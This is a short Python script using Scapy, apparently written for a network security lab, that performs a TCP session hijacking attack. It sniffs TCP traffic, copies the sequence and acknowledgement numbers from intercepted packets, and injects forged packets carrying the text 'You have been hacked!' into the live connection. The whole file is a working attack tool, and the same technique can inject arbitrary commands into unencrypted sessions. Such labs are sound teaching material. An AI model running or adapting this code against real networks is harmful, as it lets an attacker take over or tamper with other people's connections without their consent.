# Mohamed Trigui
# 9/26/24
# TCP Hijacking attack (runs on Host 3)

#!/usr/bin/python3
from scapy.all import *

# A set to keep track of spoofed connections
spoofed_connections = set()

def spoof(pkt):
    if pkt.haslayer(TCP) and pkt[TCP].flags == "PA":
        # Create a unique identifier for the connection
        conn_id = (pkt[IP].src, pkt[TCP].sport, pkt[IP].dst, pkt[TCP].dport)
        
        if conn_id in spoofed_connections:
            return  # Skip if already spoofed this connection
        
        print("[+] Intercepted a TCP packet, preparing to spoof...")
        
        # Extract current SEQ and ACK
        old_seq = pkt[TCP].seq
        old_ack = pkt[TCP].ack
        print(f"[+] Intercepted SEQ: {old_seq}, Intercepted ACK: {old_ack}")
        
        # Craft spoofed packet with correct SEQ and ACK numbers
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="PA", 
                  seq=old_ack, ack=old_seq + len(pkt[Raw]) if pkt.haslayer(Raw) else 0)
        
        data = "You have been hacked!"
        spoofed_pkt = ip/tcp/data
        send(spoofed_pkt, verbose=0)
        print(f"[+] Sent spoofed packet with SEQ: {tcp.seq}, ACK: {tcp.ack}")
        
        # Mark this connection as spoofed
        spoofed_connections.add(conn_id)


# Sniff packets from Host 1 to Host 2
f = 'tcp'
print("Sniffing ongoing session...")
sniff(filter=f, prn=spoof)


